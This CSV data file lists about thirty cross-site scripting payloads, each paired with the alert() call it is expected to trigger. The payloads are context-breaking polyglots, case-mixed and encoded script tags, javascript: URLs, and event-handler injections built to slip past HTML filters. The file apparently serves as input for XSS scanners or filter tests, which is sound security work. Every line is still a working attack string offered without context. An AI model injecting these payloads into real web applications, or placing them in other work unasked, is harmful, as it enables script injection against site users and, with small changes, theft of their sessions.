Payload1,Payload2
"#""><img src=/ onerror=alert(2)> ",alert(1)
<svg onload=alert(1)> ,alert(1)
<script>alert('XSS');// ,alert(1)
<sCrIpt>alert(1)</ScRipt> ,alert(1)
<a href=javas&#99;ript:alert(1)> ,alert(1)
<script x>alert('XSS')<script y> ,alert(1)
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",alert()
"javascript:""/*'/*`/*\"" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//> ",alert()
"javascript:""/*\""/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>",alert()
"javascript:`//""//\""//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>` ",alert()
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",alert()
""">><marquee><img src=x onerror=confirm(1)></marquee>"" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"" ></script><script>alert(1)</script>""><img/id=""confirm&lpar; 1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http: //i.imgur.com/P8mL8.jpg"">",alert(1)
""" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// ",alert(1)
"';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//"";alert(String.fromCharCode (88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT> ",alert(XSS)
"javascript://'/</title></style></textarea></script>--><p"" onclick=alert()//>*/alert()/*",alert()
"javascript://--></script></title></style>""/</textarea>*/<alert()/*' onclick=alert()//>a",alert()
"javascript://</title>""/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/",alert()
"javascript://</title></style></textarea>--></script><a""//' onclick=alert()//>*/alert()/*",alert()
"javascript://'//"" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*",alert()
"javascript://</title></textarea></style></script --><li '//"" '*/alert()/*', onclick=alert()//",alert()
"javascript:alert()//--></script></textarea></style></title><a""//' onclick=alert()//>*/alert()/*",alert()
"--></script></title></style>""/</textarea><a' onclick=alert()//>*/alert()/*",alert()
"/</title/'/</style/</script/</textarea/--><p"" onclick=alert()//>*/alert()/*",alert()
"javascript://--></title></style></textarea></script><svg ""//' onclick=alert()//",alert()
"/</title/'/</style/</script/--><p"" onclick=alert()//>*/alert()/* ",alert()
"-->'""/></sCript><svG x="">"" onload=(co\u006efirm)``> ",alert()
<svg%0Ao%00nload=%09((pro\u006dpt))()// ,alert()
